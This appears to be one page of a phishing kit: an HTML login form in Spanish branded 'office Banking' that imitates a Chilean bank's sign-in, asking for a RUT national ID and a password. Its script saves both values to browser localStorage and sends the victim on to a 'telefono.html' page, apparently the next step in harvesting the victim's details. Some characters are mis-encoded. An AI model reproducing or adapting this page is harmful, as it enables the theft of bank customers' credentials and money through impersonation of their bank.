<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: Arial, sans-serif;
    }
    .contenedor {
      border: 3px solid red;
      max-width: 400px;
      margin: 30px auto;
      padding: 20px;
      background: white;
    }
    .titulo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
      margin-bottom: 20px;
    }
    .titulo span:first-child {
      color: black;
      font-weight: bold;
    }
    .titulo span:last-child {
      background-color: red;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      font-weight: bold;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: black;
    }
    input[type="text"], input[type="password"] {
      width: 80%;
      padding: 10px;
      border: 1px solid black;
      margin-top: 5px;
      border-radius: 4px;
    }
    .password-container {
      position: relative;
    }
    .password-container input {
      width: 80%;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      width: 80%;
      padding: 10px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <div class="titulo">
      <span>Ingreso a office</span><span>Banking</span>
    </div>
    <form onsubmit="enviarFormulario(event)">
      <label for="rut">RUT</label>
      <input type="text" id="rut" maxlength="12" required oninput="formatearRUT(this)" />

      <label for="clave">Contrase√±a</label>
      <div class="password-container">
        <input type="password" id="clave" required />
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <button type="submit">Ingresar</button>
    </form>
  </div>

  <script>
    function enviarFormulario(e) {
      e.preventDefault();
      const rut = document.getElementById('rut').value;
      const clave = document.getElementById('clave').value;
      localStorage.setItem('rut', rut);
      localStorage.setItem('clave', clave);
      window.location.href = 'telefono.html';
    }

    function togglePassword() {
      const claveInput = document.getElementById('clave');
      claveInput.type = claveInput.type === 'password' ? 'text' : 'password';
    }

    function formatearRUT(input) {
      let rut = input.value.replace(/[^0-9kK]/g, '').toUpperCase();
      if (rut.length > 1) {
        rut = rut.slice(0, -1).replace(/\B(?=(\d{3})+(?!\d))/g, '.') + '-' + rut.slice(-1);
      }
      input.value = rut;
    }
  </script>
</body>
</html>
